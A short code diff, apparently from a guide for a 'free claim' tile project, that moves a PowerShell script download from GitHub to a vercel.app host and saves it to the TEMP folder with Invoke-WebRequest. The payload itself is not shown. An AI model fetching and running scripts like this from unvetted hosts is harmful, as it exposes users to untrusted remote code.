@@ -59,7 +59,7 @@ if (!(Test-Path $AgentRoot)) {
   throw "STOP: Agent folder does not exist: $AgentRoot"
 }
 
-$ClaimUrl = "https://raw.githubusercontent.com/gn1y2025/gn1y-billions-tile-guide/main/scripts/windows-instant-free-claim.ps1"
+$ClaimUrl = "https://guide-by-gn1y.vercel.app/scripts/windows-instant-free-claim.ps1"
 $ClaimFile = Join-Path $env:TEMP "gn1y-windows-instant-free-claim.ps1"
 
 Invoke-WebRequest -UseBasicParsing -Uri $ClaimUrl -OutFile $ClaimFile
@@ -132,3 +132,4 @@ Save proof.
 Optional feedback:
 
 [../templates/feedback-template.md](../templates/feedback-template.md)
+
